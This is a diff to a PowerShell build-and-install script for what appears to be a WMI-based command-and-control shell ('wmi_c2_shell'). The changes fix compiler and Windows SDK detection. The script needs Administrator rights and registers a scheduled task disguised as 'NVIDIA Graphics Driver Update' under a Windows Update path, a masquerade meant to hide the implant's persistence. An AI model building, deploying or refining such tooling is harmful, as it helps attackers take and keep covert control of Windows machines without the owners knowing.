@@ -20,19 +20,6 @@ $SourceFile = Join-Path $SourceDir "wmi_c2_shell.c"
 $ObjectFile = Join-Path $SourceDir "wmi_c2_shell.obj"
 $ExecutableFile = Join-Path $SourceDir $ExecutableName
 
-# Auto-detect latest MSVC compiler
-$MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
-$LatestMSVC = Get-ChildItem $MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
-
-$CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
-$LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
-
-# Auto-detect latest Windows Kit (WDK/SDK) include & lib
-$WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
-$LatestKit = Get-ChildItem $WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
-$WindowsKitInclude = Join-Path $LatestKit.FullName "um"
-$WindowsKitLib = Join-Path ("C:\Program Files (x86)\Windows Kits\10\Lib\" + $LatestKit.Name + "\um\x64")
-
 $TaskName = "NVIDIA Graphics Driver Update"
 $TaskPath = "\Microsoft\Windows\WindowsUpdate\"
 $FullTaskName = "$TaskPath$TaskName"
@@ -50,15 +37,15 @@ function Check-Administrator {
 }
 
 # ============================================================================
-# AUTO-INSTALL VISUAL STUDIO + WDK
+# AUTO-INSTALL VISUAL STUDIO + WINDOWS SDK
 # ============================================================================
 
 $VSInstaller = Join-Path $SourceDir "vs_community.exe"
-$WDKInstaller = Join-Path $SourceDir "wdksetup.exe"
+$SDKInstaller = Join-Path $SourceDir "winsdksetup.exe"
 
 # Download URLs (official)
 $VSUrl = "https://aka.ms/vs/16/release/vs_community.exe"
-$WDKUrl = "https://go.microsoft.com/fwlink/?linkid=2128854"  # Latest WDK link
+$SDKUrl = "https://go.microsoft.com/fwlink/p/?linkid=2120843"  # Windows SDK installer
 
 function Download-File($url, $path) {
     if (-not (Test-Path $path)) {
@@ -76,19 +63,43 @@ function Install-VS {
     Write-Host "[+] Visual Studio installation finished" -ForegroundColor Green
 }
 
-function Install-WDK {
-    Write-Host "[*] Installing Windows Driver Kit ..." -ForegroundColor Cyan
-    Start-Process -Wait -FilePath $WDKInstaller -ArgumentList "/quiet /norestart"
-    Write-Host "[+] WDK installation finished" -ForegroundColor Green
+function Install-SDK {
+    Write-Host "[*] Installing Windows Software Development Kit ..." -ForegroundColor Cyan
+    Start-Process -Wait -FilePath $SDKInstaller -ArgumentList "/quiet /norestart /features OptionId.WindowsSoftwareDevelopmentKit"
+    Write-Host "[+] Windows SDK installation finished" -ForegroundColor Green
 }
 
 # Download installers if missing
 Download-File $VSUrl $VSInstaller
-Download-File $WDKUrl $WDKInstaller
+Download-File $SDKUrl $SDKInstaller
 
 # Install if not detected
 if (-not (Test-Path $CompilerPath)) { Install-VS }
-if (-not (Test-Path $WindowsKitInclude)) { Install-WDK }
+if (-not (Test-Path $WindowsKitInclude)) { Install-SDK }
+
+# Auto-detect latest versions after installation
+$MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
+if (Test-Path $MSVCBase) {
+    $LatestMSVC = Get-ChildItem $MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
+    if ($LatestMSVC) {
+        $CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
+        $LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
+        $MSVCInclude = Join-Path $LatestMSVC.FullName "include"
+        $MSVCLib = Join-Path $LatestMSVC.FullName "lib\x64"
+    }
+}
+
+$WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
+if (Test-Path $WindowsKitBase) {
+    $LatestKit = Get-ChildItem $WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
+    if ($LatestKit) {
+        $WindowsKitInclude = Join-Path $LatestKit.FullName "um"
+        $WindowsKitShared = Join-Path $LatestKit.FullName "shared"
+        $WindowsKitUcrt = Join-Path $LatestKit.FullName "ucrt"
+        $WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\um\x64"
+        $WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
+    }
+}
 
 function Check-VisualStudio {
     if (-not (Test-Path $CompilerPath)) {
@@ -100,9 +111,25 @@ function Check-VisualStudio {
         Write-Host "[!] Linker not found at: $LinkPath" -ForegroundColor Red
         return $false
     }
+    if (-not (Test-Path $MSVCInclude)) {
+        Write-Host "[!] MSVC headers not found at: $MSVCInclude" -ForegroundColor Red
+        return $false
+    }
+    if (-not (Test-Path $MSVCLib)) {
+        Write-Host "[!] MSVC libs not found at: $MSVCLib" -ForegroundColor Red
+        return $false
+    }
     if (-not (Test-Path $WindowsKitInclude)) {
-        Write-Host "[!] Windows Kit headers not found at: $WindowsKitInclude" -ForegroundColor Red
-        Write-Host "[!] Install Windows Driver Kit (WDK)" -ForegroundColor Red
+        Write-Host "[!] Windows SDK headers not found at: $WindowsKitInclude" -ForegroundColor Red
+        Write-Host "[!] Install Windows Software Development Kit (SDK)" -ForegroundColor Red
+        return $false
+    }
+    if (-not (Test-Path $WindowsKitShared)) {
+        Write-Host "[!] Windows SDK shared headers not found at: $WindowsKitShared" -ForegroundColor Red
+        return $false
+    }
+    if (-not (Test-Path $WindowsKitUcrt)) {
+        Write-Host "[!] Windows SDK UCRT headers not found at: $WindowsKitUcrt" -ForegroundColor Red
         return $false
     }
     return $true
@@ -136,7 +163,7 @@ if (-not (Check-Administrator)) {
 Write-Host "[+] Running as Administrator" -ForegroundColor Green
 
 if (-not (Check-VisualStudio)) {
-    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + WDK)" -ForegroundColor Red
+    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + Windows SDK)" -ForegroundColor Red
     exit 1
 }
 Write-Host "[+] Visual Studio and WDK found" -ForegroundColor Green
@@ -156,11 +183,17 @@ try {
     Write-Host "    Compiling to object file..." -ForegroundColor Gray
     $CompileArgs = @(
         "/c", "/W0", "/O2", "/D", "NDEBUG",
+        "/I", $MSVCInclude,
         "/I", $WindowsKitInclude,
+        "/I", $WindowsKitShared,
+        "/I", $WindowsKitUcrt,
         $SourceFile,
         "/Fo$ObjectFile"
     )
-    & $CompilerPath @CompileArgs 2>&1 | Out-Null
+    $CompileOutput = & $CompilerPath @CompileArgs 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        throw "Compilation failed: $CompileOutput"
+    }
     
     if (-not (Test-Path $ObjectFile)) {
         throw "Object file not created"
@@ -169,13 +202,18 @@ try {
     Write-Host "    Linking executable..." -ForegroundColor Gray
     $LinkArgs = @(
         "/SUBSYSTEM:CONSOLE", "/MACHINE:X64",
+        "/LIBPATH:$MSVCLib",
         "/LIBPATH:$WindowsKitLib",
+        "/LIBPATH:$WindowsKitUcrtLib",
         $ObjectFile,
         "kernel32.lib", "wbemuuid.lib", "oleaut32.lib", "ole32.lib",
         "ws2_32.lib", "secur32.lib", "crypt32.lib",
         "/OUT:$ExecutableFile"
     )
-    & $LinkPath @LinkArgs 2>&1 | Out-Null
+    $LinkOutput = & $LinkPath @LinkArgs 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        throw "Linking failed: $LinkOutput"
+    }
     
     if (-not (Test-Path $ExecutableFile)) {
         throw "Executable not created"
